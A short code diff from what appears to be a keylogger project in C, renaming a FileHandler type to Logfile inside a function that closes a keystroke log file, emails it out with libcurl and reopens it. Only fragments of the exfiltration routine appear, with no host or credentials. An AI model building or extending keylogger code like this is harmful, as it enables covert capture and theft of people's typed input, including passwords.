@@ -2,8 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "utils/helpers.h"
-#include "keylogger/file_handler.h"
+#include "utils/time_utils.h"
 #include "keylogger/send_email.h"
 
 
@@ -55,11 +54,11 @@ int EmailSender_init(EmailSender *sender) {
 }
 
 
-int send_file_via_email(EmailSender *sender, FileHandler *fh) {
+int send_file_via_email(EmailSender *sender, Logfile *fh) {
      CURLcode res = CURLE_OK;
      char time_str[9];
 
-    if (FileHandler_close(fh)) {
+    if (Logfile_close(fh)) {
         fprintf(stderr, "Failed to close file before sending\n");
         return 1;
     }
@@ -101,7 +100,7 @@ int send_file_via_email(EmailSender *sender, FileHandler *fh) {
         printf("Email sent successfully: %s\n", time_str);
     }
 
-    if (FileHandler_init(fh)) {
+    if (Logfile_init(fh)) {
         fprintf(stderr, "Failed to reopen file after sending\n");
         return 1;
     }
